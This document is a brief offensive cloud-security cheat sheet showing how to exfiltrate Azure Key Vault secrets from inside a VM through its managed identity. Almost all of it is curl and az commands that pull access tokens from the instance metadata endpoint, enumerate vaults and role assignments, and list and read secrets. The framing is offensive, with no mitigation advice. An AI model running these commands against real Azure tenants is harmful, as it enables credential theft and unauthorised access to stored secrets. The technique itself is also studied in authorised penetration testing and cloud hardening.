# Azure Managed Identity → Key Vault Secret Exfiltration

A VM with an assigned managed identity can request access tokens from the Instance Metadata Service (IMDS). If that identity has Key Vault `Secrets Get` RBAC permissions, you can read all secrets without any credentials.

```bash
# From inside the Azure VM:

# Get access token for Azure management plane
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['access_token'])"

# Get access token for Key Vault
VAULT_TOKEN=$(curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Enumerate Key Vaults (use management token)
az login --identity
az keyvault list -o table

# List secrets in a Key Vault
curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://<VAULT-NAME>.vault.azure.net/secrets?api-version=7.3" | python3 -m json.tool

# Read a specific secret
curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://<VAULT-NAME>.vault.azure.net/secrets/<SECRET-NAME>?api-version=7.3"
```

Check RBAC assignments to enumerate what the managed identity can access:
```bash
az role assignment list --assignee <managed-identity-object-id> -o table
```
